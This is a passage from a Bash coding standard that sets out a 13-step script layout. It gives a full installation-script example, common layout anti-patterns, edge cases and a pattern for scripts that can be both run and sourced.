# Bash Coding Standard

Comprehensive Bash 5.2+ coding standard (not a compatibility standard).

"This isn't just a coding standard -- it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not simpler."

NOTE: Do not over-engineer scripts; remove unused functions and variables.

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

Mandatory 13-step structural layout for all Bash scripts ensuring consistency, maintainability, and safe initialization. Covers shebang through `#fin` marker, including metadata, shopt settings, dual-purpose patterns, FHS compliance, file extensions, and bottom-up function organization (low-level utilities before high-level orchestration).


---


**Rule: BCS010101**

### Complete Working Example

Production installation script demonstrating all 13 BCS0101 layout steps.

```bash
#!/bin/bash
#shellcheck disable=SC2034
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script Metadata
declare -r VERSION=2.2.420
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global Variables
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- APP_NAME=my_app_420
declare -- SYSTEM_USER=my_app_user_420
declare -- BIN_DIR="$PREFIX"/bin LIB_DIR="$PREFIX"/lib SHARE_DIR="$PREFIX"/share
declare -- CONFIG_DIR=/etc/"$APP_NAME" LOG_DIR=/var/log/"$APP_NAME"
declare -i DRY_RUN=0 FORCE=0 INSTALL_SYSTEMD=0 VERBOSE=1
declare -a WARNINGS=() INSTALLED_FILES=()

# Color Definitions
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# Utility Functions
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho) : ;; info) prefix+=" ${CYAN}◉${NC}" ;; warn) prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;; error) prefix+=" ${RED}✗${NC}" ;; *) ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
yn() { local -- REPLY; read -r -n 1 -p "$SCRIPT_NAME: ${YELLOW}▲${NC} ${1:-'Continue?'} y/n "; echo; [[ ${REPLY,,} == y ]]; }
noarg() { (($# > 1)) || die 22 "Option ${1@Q} requires an argument"; }

# Business Logic
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin; LIB_DIR="$PREFIX"/lib; SHARE_DIR="$PREFIX"/share
  CONFIG_DIR=/etc/"$APP_NAME"; LOG_DIR=/var/log/"$APP_NAME"
}

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Installation script
Usage: $SCRIPT_NAME [Options]
Options:
  -p, --prefix DIR   Installation prefix (default: /usr/local)
  -u, --user USER    System user for service
  -n, --dry-run      Show what would be done
  -f, --force        Overwrite existing files
  -s, --systemd      Install systemd service unit
  -v, --verbose      Enable verbose output
  -q, --quiet        Disable verbose output
  -h, --help         Display this help
  -V, --version      Display version
HELP
}

check_prerequisites() {
  local -i missing=0; local -- cmd
  for cmd in install mkdir chmod chown; do
    command -v "$cmd" >/dev/null 2>&1 || { error "Required command not found ${cmd@Q}"; missing=1; }
  done
  if ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1; then
    error 'systemd requested but systemctl not found'; missing=1
  fi
  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 1 'PREFIX cannot be empty'
  ! [[ "$PREFIX" =~ [[:space:]] ]] || die 22 "PREFIX cannot contain spaces ${PREFIX@Q}"
  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || die 22 'Invalid APP_NAME format'
  [[ -n "$SYSTEM_USER" ]] || die 22 'SYSTEM_USER cannot be empty'
  if [[ ! -d "$PREFIX" ]]; then
    if ((FORCE)) || yn "Create PREFIX directory ${PREFIX@Q}?"; then vecho "Will create ${PREFIX@Q}"
    else die 1 'Installation cancelled'; fi
  fi
  success 'Configuration validated'
}

create_directories() {
  local -- dir
  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then info "[DRY-RUN] Would create ${dir@Q}"; continue; fi
    if [[ -d "$dir" ]]; then vecho "Directory exists ${dir@Q}"
    else mkdir -p "$dir" || die 1 "Failed to create ${dir@Q}"; success "Created ${dir@Q}"; fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR"/bin target=$BIN_DIR
  [[ -d "$source" ]] || die 2 "Source not found ${source@Q}"
  ((DRY_RUN==0)) || { info "[DRY-RUN] Would install binaries"; return 0; }
  local -- file basename target_file; local -i count=0
  for file in "$source"/*; do
    [[ -f "$file" ]] || continue
    basename=${file##*/}; target_file="$target"/"$basename"
    if [[ -f "$target_file" ]] && ! ((FORCE)); then warn "Exists (use --force) ${target_file@Q}"; continue; fi
    install -m 755 "$file" "$target_file" || die 1 "Failed to install ${basename@Q}"
    INSTALLED_FILES+=("$target_file"); count+=1
  done
  success "Installed $count binaries"
}

install_libraries() {
  local -- source="$SCRIPT_DIR"/lib target="$LIB_DIR"/"$APP_NAME"
  [[ -d "$source" ]] || { vecho 'No libraries'; return 0; }
  ((DRY_RUN==0)) || { info "[DRY-RUN] Would install libraries"; return 0; }
  mkdir -p "$target" || die 1 "Failed to create ${target@Q}"
  cp -r "$source"/* "$target"/ || die 1 'Library installation failed'
  chmod -R a+rX "$target"; success "Installed libraries"
}

generate_config() {
  local -- config_file="$CONFIG_DIR"/"$APP_NAME".conf
  ((DRY_RUN==0)) || { info "[DRY-RUN] Would generate config"; return 0; }
  if [[ -f "$config_file" ]] && ! ((FORCE)); then warn "Config exists ${config_file@Q}"; return 0; fi
  cat > "$config_file" <<CONFIG
# $APP_NAME configuration
[installation]
prefix = $PREFIX
version = $VERSION
[paths]
bin_dir = $BIN_DIR
lib_dir = $LIB_DIR
[runtime]
user = $SYSTEM_USER
CONFIG
  chmod 644 "$config_file"; success "Generated config"
}

install_systemd_unit() {
  ((INSTALL_SYSTEMD)) || return 0
  local -- unit_file=/etc/systemd/system/"$APP_NAME".service
  if ((DRY_RUN)); then info "[DRY-RUN] Would install systemd unit"; return 0; fi
  cat > "$unit_file" <<UNIT
[Unit]
Description=$APP_NAME Service
After=network.target
[Service]
Type=simple
User=$SYSTEM_USER
ExecStart=$BIN_DIR/$APP_NAME
Restart=on-failure
[Install]
WantedBy=multi-user.target
UNIT
  chmod 644 "$unit_file"
  systemctl daemon-reload || warn 'Failed to reload systemd'
  success "Installed systemd unit"
}

set_permissions() {
  if ((DRY_RUN)); then info '[DRY-RUN] Would set permissions'; return 0; fi
  if id "$SYSTEM_USER" >/dev/null 2>&1; then
    chown -R "$SYSTEM_USER":"$SYSTEM_USER" "$LOG_DIR" 2>/dev/null || warn "Failed to set ownership"
  else warn "User ${SYSTEM_USER@Q} does not exist"; fi
  success 'Permissions configured'
}

show_summary() {
  echo "${BOLD}Summary${NC}: $APP_NAME $VERSION @ $PREFIX"
  echo "Files: ${#INSTALLED_FILES[@]} Warnings: ${#WARNINGS[@]}"
  ((DRY_RUN)) && echo "${CYAN}DRY-RUN - no changes${NC}"
}

# main() Function
main() {
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift; PREFIX=$1; update_derived_paths ;;
      -u|--user)     noarg "$@"; shift; SYSTEM_USER=$1 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;
      -s|--systemd)  INSTALL_SYSTEMD=1 ;;
      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -V|--version)  echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -h|--help)     show_help; return 0 ;;
      -[punfsvqVh]*) #shellcheck disable=SC2046
                     set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option ${1@Q}" ;;
      *)             die 2  "Unexpected argument ${1@Q}" ;;
    esac
    shift
  done

  readonly -- PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -- VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  ((DRY_RUN==0)) || info 'DRY-RUN mode'
  info "Installing $APP_NAME $VERSION"

  check_prerequisites; validate_config; create_directories
  install_binaries; install_libraries; generate_config
  install_systemd_unit; set_permissions; show_summary

  ((DRY_RUN)) && info 'Run without --dry-run to install' || success "Installation complete!"
}

main "$@"
#fin
```

---

## Key Patterns

**13-Step Structure:** Shebang�'shellcheck�'description�'strict mode�'shopt�'metadata�'globals�'colors�'utilities�'business logic�'main�'invocation�'#fin

**Functional:** Dry-run throughout • Force mode overwrites • Derived paths via `update_derived_paths()` • Validation before filesystem ops • Error arrays • Interactive prompts • Conditional systemd • Progressive readonly • Short option expansion


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**Violations of BCS0101 13-step layout pattern with incorrect and correct approaches.**

---

## Anti-Patterns

### ✗ Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash
# Script starts without error handling
VERSION=1.0.0
rm -rf /important/data  # Fails silently
```

**Problem:** Errors not caught, script continues after failures.

### ✓ Correct: Error Handling First

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose
declare -r VERSION=1.0.0
```

---

### ✗ Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  ((VERBOSE)) && echo 'Starting...' ||:  # VERBOSE not declared yet
  process_files
}

declare -i VERBOSE=0  # Too late!

main "$@"
#fin
```

**Problem:** "unbound variable" errors with `set -u`.

### ✓ Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  ((VERBOSE==0)) || echo 'Starting...'
  process_files
}

main "$@"
#fin
```

---

### ✗ Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"  # die() not defined yet!
  done
}

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main "$@"
#fin
```

**Problem:** Violates bottom-up organization; harder to understand.

### ✓ Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
  done
}

main "$@"
#fin
```

---

### ✗ No `main()` in Large Script

```bash
#!/usr/bin/env bash
set -euo pipefail

# ... 200 lines of code ...
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'; exit 0
fi

check_prerequisites
validate_config
install_files
#fin
```

**Problem:** No clear entry point, argument parsing scattered, can't source to test individual functions.

### ✓ Correct: Use `main()` for Scripts Over 200 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

main() {
  while (($#)); do
    case $1 in
      -h|--help) show_help; exit 0 ;;
      -*)        die 22 "Invalid option ${1@Q}" ;;
      *)         die 2 "Invalid argument ${1@Q}" ;;
    esac
    shift
  done

  check_prerequisites
  validate_config
  install_files
}

main "$@"
#fin
```

---

### ✗ Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

main() { echo 'Hello, World!'; }

main "$@"
# File ends without #fin
```

**Problem:** No visual confirmation file is complete; harder to detect truncation.

### ✓ Correct: Always End With `#fin`

```bash
main "$@"
#fin
```

---

### ✗ Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r PREFIX=/usr/local
readonly -- PREFIX  # Too early!

main() {
  while (($#)); do
    case $1 in
      --prefix) shift; PREFIX=$1 ;;  # FAILS - readonly!
    esac
    shift
  done
}
#fin
```

**Problem:** Variables modified during argument parsing made readonly too early.

### ✓ Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -- PREFIX=/usr/local  # Mutable during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix) shift; PREFIX=$1 ;;  # OK - not readonly yet
    esac
    shift
  done

  readonly -- PREFIX  # Now make readonly
}

main "$@"
#fin
```

---

### ✗ Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -i VERBOSE=0

check_something() { echo 'Checking...'; }

declare -- PREFIX=/usr/local  # Globals scattered!
declare -- CONFIG_FILE=''

main "$@"
#fin
```

**Problem:** Globals scattered throughout file; hard to see all state variables.

### ✓ Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

check_something() { echo 'Checking...'; }

main "$@"
#fin
```

---

### ✗ Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
set -euo pipefail  # Modifies caller's shell!

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main "$@"  # Runs automatically when sourced!
#fin
```

**Problem:** When sourced, modifies caller's shell settings and runs `main` automatically.

### ✓ Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash

error() { >&2 echo "ERROR: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

main() {
  echo 'Running main'
}

main "$@"
#fin
```

---

## Summary

Eight common BCS0101 violations:

1. **Missing strict mode** - Scripts without `set -euo pipefail` fail silently
2. **Declaration order** - Variables must be declared before use
3. **Function organization** - Utilities before business logic
4. **Missing main()** - Large scripts need structured entry point
5. **Missing end marker** - Scripts must end with `#fin`
6. **Premature readonly** - Variables must be mutable until after parsing
7. **Scattered declarations** - All globals must be grouped together
8. **Unprotected sourcing** - Dual-purpose scripts must protect execution code


---


**Rule: BCS010103**

### Edge Cases and Variations

**Special scenarios where the standard 13-step BCS0101 layout may be modified or simplified.**

---

## When to Skip `main()` Function

**Small scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

## Sourced Library Files

**Files meant only to be sourced** skip execution parts and `set -e`:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() { [[ "$1" =~ ^-?[0-9]+$ ]]; }

is_valid_email() { [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; }

# No main(), no execution
#fin
```

## Scripts With External Configuration

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-"$HOME"/.config}"/myapp/config.sh
declare -- DATA_DIR="${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config ${CONFIG_FILE@Q}"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR
```

## Platform-Specific Sections

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM=macos ;;
  Linux)  PLATFORM=linux ;;
  *)      PLATFORM=unknown ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER=brew
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER=apt
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform ${PLATFORM@Q}"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD
```

## Scripts With Cleanup Requirements

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## Legitimate Deviations

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Lock files** - Add lock acquisition/release around main execution

---

## Key Principles

Even when deviating:

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

---

## Anti-Pattern: Arbitrary Reordering

**Wrong:**
```bash
# ✗ Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!
shopt -s inherit_errexit shift_verbose extglob nullglob

# Globals scattered
declare -r VERSION=1.0.0
check_system() { : ... }
declare -- PREFIX=/usr
```

**Correct:**
```bash
# ✓ Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
declare -- PREFIX=/usr

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

Edge cases exist for:
- **Simplification** for tiny scripts
- **Libraries** that shouldn't modify sourcing environment
- **External config** that must override defaults
- **Platform detection** for cross-platform compatibility
- **Cleanup traps** for resource management

Core principles remain: error handling first, dependencies before usage, clear structure. Deviate only when necessary.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts follow a 13-step structural layout ensuring consistency and correctness. This bottom-up pattern places utilities before orchestration, allowing each component to call previously defined functions.**

See: **BCS010101** (working example), **BCS010102** (anti-patterns), **BCS010103** (edge cases)

---

## Rationale

1. **Predictability** - Developers know where to find components: metadata step 6, utilities step 9, business logic step 10
2. **Safe Initialization** - Error handling before commands, metadata before functions, globals before references
3. **Bottom-Up Dependencies** - Lower-level components defined before higher-level ones that depend on them
4. **Testing** - Source script to test individual functions; consistent structure aids debugging
5. **Error Prevention** - Strict ordering prevents undefined functions, uninitialized variables, premature execution
6. **Production Readiness** - Includes version tracking, error handling, terminal detection, argument validation

---

## The 13 Mandatory Steps

### Step 1: Shebang
```bash
#!/bin/bash
```
Alternatives: `#!/usr/bin/bash` or `#!/usr/bin/env bash` (portable, respects PATH)

### Step 2: ShellCheck Directives (if needed)
```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
#shellcheck disable=SC1091  # Don't follow sourced files
```
Always include explanatory comments for disabled checks.

### Step 3: Brief Description Comment
```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

### Step 4: `set -euo pipefail`
```bash
set -euo pipefail
```
- `set -e` - Exit on command failure
- `set -u` - Exit on undefined variable
- `set -o pipefail` - Pipelines fail if any command fails

**MUST come before any commands.** Optional Bash 5 check:
```bash
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; }
```

### Step 5: `shopt` Settings
```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```
- `inherit_errexit` - Subshells inherit set -e
- `shift_verbose` - Catches argument parsing bugs
- `extglob` - Extended patterns: `@(pattern)`, `!(pattern)`
- `nullglob` - Empty globs expand to nothing

### Step 6: Script Metadata
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```
SC2155 can be safely ignored with `realpath`. On some systems `realpath` is a builtin (10x faster).

### Step 7: Global Variable Declarations
```bash
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- CONFIG_FILE='' LOG_FILE=''
declare -i VERBOSE=0 DRY_RUN=0 FORCE=0
declare -a INPUT_FILES=() WARNINGS=()
```
Type declarations: `declare -i` integers, `declare --` strings, `declare -a` indexed arrays, `declare -A` associative arrays.

### Step 8: Color Definitions (if terminal output)
```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```
Skip if no colored output needed.

### Step 9: Utility Functions
```bash
declare -i VERBOSE=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
yn() {
  local -- REPLY
  read -r -n 1 -p "$SCRIPT_NAME: ${YELLOW}▲${NC} ${1:-'Continue?'} y/n "
  echo
  [[ ${REPLY,,} == y ]]
}
```

Simple alternative for scripts without color:
```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

### Step 10: Business Logic Functions
```bash
check_prerequisites() {
  local -i missing=0
  local -- cmd
  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing+=1
    fi
  done
  ((missing==0)) || die 1 "Missing $missing required commands"
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist ${PREFIX@Q}"
}
```
Organize bottom-up: lower-level functions first, higher-level later.

### Step 11: `main()` Function
```bash
main() {
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift; PREFIX=$1 ;;
      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -V|--version)  echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -h|--help)     show_help; return 0 ;;
      -[pvqnfVh]*) #shellcheck disable=SC2046
                     set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option ${1@Q}" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done
  readonly -- PREFIX CONFIG_FILE LOG_FILE
  readonly -i VERBOSE DRY_RUN FORCE

  check_prerequisites
  validate_config
}
```
Required for scripts >200 lines. Exception: scripts <100 lines can skip `main()`.

### Step 12: Script Invocation
```bash
main "$@"
```
**ALWAYS quote `"$@"`** to preserve argument array.

### Step 13: End Marker
```bash
#fin
```
OR `#end`. Confirms script is complete (not truncated).

---

## Structure Summary Tables

### Executable Scripts
| Order | Status | Step |
|-------|--------|------|
| 0 | Man | Shebang |
| 1 | Opt | ShellCheck directives |
| 2 | Opt | Description comment |
| 3 | Man | `set -euo pipefail` |
| 4 | Opt | Bash 5 version test |
| 5 | Rec | `shopt` settings |
| 6 | Rec | Script Metadata |
| 7 | Rec | Global Variables |
| 8 | Rec | Color Definitions |
| 9 | Rec | Utility Functions |
| 10 | Rec | Business Logic |
| 11 | Rec | `main()` |
| 12 | Rec | `main "$@"` |
| 13 | Man | `#end` Marker |

### Module/Library Scripts
Skip steps 3 (`set -e`), 11-12 (`main`). Step 10 (Business Logic) is Rec.

### Combined Module+Executable
Add step 14: `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0` then repeat steps 0-13 for executable portion.

---

## Anti-Patterns

1. **Missing `set -euo pipefail`** - Must be first command
2. **Variables before declaration** - All globals declared upfront in step 7
3. **Business logic before utilities** - Messaging functions must exist before code calls them
4. **No `main()` in large scripts** - Required for >200 lines
5. **Missing end marker** - `#fin` or `#end` mandatory

---

## Edge Cases

1. **Tiny scripts (<100 lines)** - May skip `main()`, steps 11-12
2. **Sourced libraries** - Skip `set -e`, `main()`, invocation; keep shebang and end marker
3. **Combined module+executable** - Use `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0` guard


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Scripts designed to work both as standalone executables and source libraries. `set -euo pipefail` and `shopt` settings must **ONLY** be applied when executed directly, **NOT** when sourced.

**Rationale:** When sourced, applying `set -e` or modifying `shopt` would alter the calling shell's environment, breaking the caller's error handling or glob behavior.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script
: ...

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION=1.0.0
  #shellcheck disable=SC2155
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern breakdown:**
1. **Function definitions first** - Define library functions at top, export with `declare -fx` if needed
2. **Early return** - `[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0` - when sourced: functions loaded, clean exit
3. **Visual separator** - Clear comment marks executable section boundary
4. **Set and shopt** - Only applied when executed, placed immediately after separator
5. **Metadata with guard** - `[[ ! -v SCRIPT_VERSION ]]` prevents re-initialization, safe for multiple sourcing

**Alternative pattern (if/else)** for different initialization per mode:
```bash
#!/bin/bash

process_data() { ... }
declare -fx process_data

if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  declare -r DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  declare -r DATA_DIR=${DATA_DIR:-/tmp/test_data}
fi
```

**Key principles:**
- Prefer early return pattern for simplicity
- Place function definitions **before** sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` and `source script.sh`

**Common use cases:** Utility libraries with CLI demos, reusable functions + CLI interface, test frameworks.


---


**Rule: BCS0102**

## Shebang and Initial Setup

